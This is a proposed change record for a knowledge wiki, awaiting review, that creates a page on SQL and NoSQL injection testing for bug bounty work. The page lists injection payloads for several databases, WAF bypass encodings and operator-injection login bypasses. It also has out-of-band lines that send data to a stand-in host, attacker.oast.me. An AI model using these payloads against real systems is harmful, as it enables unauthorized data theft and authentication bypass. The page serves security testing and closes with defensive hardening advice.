---
type: llm-wiki-review
status: needs-review
decision: pending
revision: 1
operation: create
target: concepts/sql-injection-testing.md
sources:
  - raw/articles/sql-injection.md
---

# Proposed Wiki change

## What will change
Compiles a dedicated concept page detailing SQL injection testing methodologies, classification matrices, database-specific exploitation syntax, WAF bypass patterns, and NoSQL injection operator manipulation.

## Proposed content

---
title: SQL Injection Testing & Exploitation Methodology
created: 2026-09-24
updated: 2026-09-24
type: concept
tags:
  - sqli
  - bug-bounty
  - payload
sources:
  - unprocessed-obsidians/sql-injection.md
confidence: high
contested: false
contradictions: []
---

# SQL Injection Testing & Exploitation Methodology

## Overview
SQL Injection (SQLi) occurs when untrusted user input is directly concatenated or improperly sanitized inside dynamic database query interpreters. Successful injection permits adversaries to manipulate query structure, bypass authentication, extract sensitive records, modify data, and execute arbitrary operating system commands on the database host.

## SQL Injection Taxonomy & Mechanisms

| Injection Category | Mechanism | Detection Signal | Exfiltration Speed |
| :--- | :--- | :--- | :--- |
| **In-Band: Union-Based** | Appends `UNION SELECT` to merge query results with original output. | Injected columns reflected directly in HTTP response body. | High (immediate output reflection) |
| **In-Band: Error-Based** | Forces database runtime errors containing evaluated query data. | Verbose DB error strings (e.g. `XPATH syntax error`, `conversion failed`). | Medium (limited by error message length) |
| **Inferential: Boolean-Based** | Injects boolean conditions (`AND 1=1` vs `AND 1=2`) observing response differences. | Page content diffs, status codes, response lengths. | Low (bit-by-bit binary search) |
| **Inferential: Time-Based** | Injects heavy sleep functions conditional on character matching. | Server response latency delayed by specified sleep interval. | Very Low (dependent on network latency) |
| **Out-of-Band (OAST)** | Forces database server to issue outbound DNS/HTTP lookups. | Outbound callback received on external listener. | Medium (dependent on network egress egress permissions) |

## Database-Specific Exploitation Matrix

### 1. In-Band & Error-Based Extraction
- **MySQL / MariaDB**:
  - Version: `SELECT @@version`
  - Error: `AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e))`
  - Union Column Determination: `ORDER BY 1, 2, 3...` or `UNION SELECT NULL, NULL, NULL...`
- **PostgreSQL**:
  - Version: `SELECT version()`
  - Error: `AND 1=CAST((SELECT current_user) AS int)`
- **MSSQL**:
  - Version: `SELECT @@version`
  - Error: `AND 1=CONVERT(int, (SELECT @@version))`
- **Oracle**:
  - Requires `FROM dual` for SELECT statements: `UNION SELECT 'a', 'b' FROM dual`
  - Error: `AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))`

### 2. Time-Based Blind Primitives
- **MySQL**: `AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)` or `AND IF(1=1, SLEEP(5), 0)`
- **PostgreSQL**: `AND (SELECT pg_sleep(5))`
- **MSSQL**: `WAITFOR DELAY '0:0:5'`
- **Oracle**: `AND 1=dbms_pipe.receive_message(('a'), 5)`

### 3. Out-of-Band (OOB) Extraction
- **MSSQL**: `exec master..xp_dirtree '\attacker.oast.me\share'`
- **Oracle**: `SELECT UTL_HTTP.REQUEST('http://attacker.oast.me/'||user) FROM dual`
- **PostgreSQL**: `dblink` or `COPY ... FROM PROGRAM`

## Advanced WAF Bypass Techniques
1. **Comment Injection & Whitespace Obfuscation**:
   - MySQL: `UN/**/ION/**/SEL/**/ECT`, `SELECT%0A*%0AFROM%0Ausers`
   - Inline comments: `/*!50000SELECT*/`
2. **Character & String Encoding**:
   - Hexadecimal encoding: `0x61646d696e` instead of `'admin'`
   - Char function concatenation: `CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)`
3. **Alternative Logic Operators**:
   - Replacing `OR 1=1` with `OR 2>1`, `OR 'a'='a'`, `LIKE`, or bitwise `| / &`
   - Utilizing HTTP Parameter Pollution for splitting keywords across parameters.

## NoSQL Injection Primitives
Applications interacting with NoSQL databases (e.g. MongoDB, CouchDB) through JSON body parsing or query string parameters are vulnerable when query operators are accepted directly:
- **Authentication Bypass via Operator Injection**:
  ```json
  {"username": {"$ne": null}, "password": {"$gt": ""}}
  ```
- **Regex Query Extraction**:
  ```json
  {"username": "admin", "password": {"$regex": "^a.*"}}
  ```
- **JavaScript Evaluation Injection (`$where`)**:
  ```json
  {"$where": "this.username == 'admin' && this.password.match(/^a/)"}
  ```

## Defensive Hardening
- Enforce parameterized prepared statements (`PreparedStatement` in Java, PDO with emulation disabled in PHP).
- Enforce strict Object-Relational Mapping (ORM) query parameters without raw query concatenation.
- Principle of least privilege for database user accounts (disable `xp_cmdshell`, restrict file read/write privileges).

## Related Pages
- [[sql-injection]]
- [[graphql-security]]
- [[http-parameter-pollution]]

## Evidence and uncertainty
Synthesized from `unprocessed-obsidians/sql-injection.md`. Covers relational DBMS specifics and NoSQL query injection techniques.

## Human feedback
Optionally explain or edit what should change.
